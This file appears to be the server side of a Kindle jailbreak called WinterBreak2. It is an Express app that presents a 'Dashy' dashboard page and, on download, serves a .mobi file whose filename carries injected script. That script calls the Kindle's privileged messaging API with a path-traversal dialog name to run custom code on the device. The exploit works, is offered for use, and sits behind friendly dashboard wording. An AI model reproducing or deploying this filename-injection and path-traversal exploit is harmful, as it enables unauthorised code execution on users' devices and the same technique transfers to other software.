/*
    WinterBreak2
    Discovered By Scam.Net

    Written By Penguins184
*/

import express from "express";
import path from "path";
import { fileURLToPath } from "node:url";

const directory = path.dirname(fileURLToPath(import.meta.url));

export function createApp({ mode = "launch" } = {}) {
    if (!["launch", "unlock"].includes(mode)) throw new Error("Unknown Dashy setup mode");
    const unlocking = mode === "unlock";
    const dialog = unlocking ? "dialoger-pw1-retry" : "dialoger-launch";
    const title = unlocking ? "Unlock and install Dashy" : "Open Dashy";
    const description = unlocking
        ? "Paperwhite 1 Wi-Fi, firmware 5.6.1.1 only. Copy the prepared USB files first."
        : "Open your dashboard. Please allow up to one minute.";
    const app = express();
    app.use((req, res, next) => { res.set("Cache-Control", "no-store"); console.log(new Date().toISOString(), req.method, req.path); next(); });

    app.get("/", (req, res) => {
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
                <head>
                    <meta charset="utf-8">
                    <meta http-equiv="X-UA-Compatible" content="IE=edge">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                    <style>

                        html, body {
                            margin: 0;
                            padding: 0;
                            height: 100%;
                            width: 100%;
                        }

                        h1 {
                            font-family: "Libre Baskerville", serif;
                            font-weight: 400;
                            font-style: normal;
                            margin: 2px;
                        }

                        p {
                            font-family: "Inter", sans-serif;
                            font-style: normal;
                            margin: 2px;
                        }

                        .outer {
                            display: table;
                            width: 100%;
                            height: 100%;
                        }

                        .inner {
                            display: table-cell;
                            vertical-align: middle;
                            text-align: center;
                        }

                        button {
                            margin: 12px;
                            font-family: "Inter", sans-serif;
                            padding: 0.5rem 1rem;
                            font-weight: 500;
                            border: 2px solid #111827;
                            border-radius: 0.375rem;
                            background: none;
                            color: inherit;
                            cursor: pointer;
                            font-size: 0.875rem;
                        }
                    </style>
                </head>
                <body>
                    <div class="outer">
                        <div class="inner">
                            <h1>Dashy</h1>
                            <p>${description}</p>
                            <button onclick="document.location = '/download'">${title}</button>
                        </div>
                    </div>
                </body>
            </html>
        `);
    });

    app.get("/download", (req, res) => {
        const fPath = path.resolve(directory, "../assets/placeholder.mobi");
        const fName = `<script>(window.kindle||top.kindle).messaging.sendMessage("com.lab126.pillow","customDialog",{name:"../../../../mnt/us/winterbreak2/${dialog}"})</script>Open-Dashy.mobi`; //Dialog Code

        res.set({
            "Content-Type": "application/x-mobipocket-ebook",
            "Content-Disposition": `attachment; filename=${fName}`
        })

        res.sendFile(fPath, { dotfiles: "allow" }, (err) => {
            if (err) {
                console.error("Download Error:", err);
                if (!res.headersSent) res.status(500).send("Download Failed.");
            };
        });
    });

    return app;
}

// Importing the app for tests must not start a second listener.
if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
    const app = createApp({ mode: process.env.DASHY_SETUP_MODE || "launch" });
    const port = Number(process.env.PORT || 3000);
    const host = process.env.HOST || "127.0.0.1";
    app.listen(port, host, () => console.log(`Dashy ${process.env.DASHY_SETUP_MODE || "launch"} server listening on ${host}:${port}`));
}
